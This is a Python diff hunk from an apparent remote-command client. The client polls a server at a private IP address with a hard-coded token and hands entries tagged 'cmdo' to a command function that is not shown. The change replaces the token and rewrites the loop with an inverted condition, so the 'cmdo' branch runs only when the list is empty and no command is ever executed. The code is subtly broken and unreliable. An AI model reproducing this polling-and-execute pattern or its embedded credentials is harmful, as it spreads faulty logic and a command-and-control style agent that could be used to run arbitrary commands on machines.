@@ -15,13 +15,16 @@ async def poling():
         link = f'http://192.168.1.175:9566/pull/pc0'
         # print(requests.get(link).json())
         # # print(download_config('l'))
-        l = requests.post(link, data={'token': 'nvw2ztjjv9y5'}).json()['token']
-        print(l)
-        for i in l:
-            c = i[1].split(',') 
-            if c[0] == 'cmdo':
-                await cmdo(c[1], i[0])
-        await asyncio.sleep(1)
+        l = requests.post(link, data={'token': 'qhh53cm5qdz6'}).json()['token']
+        if len(l):
+            await asyncio.sleep(1)
+            
+        else:
+            for i in l:
+                c = i[1].split(',') 
+                if c[0] == 'cmdo':
+                    await cmdo(c[1], i[0])
+        
 
 
 async def main():
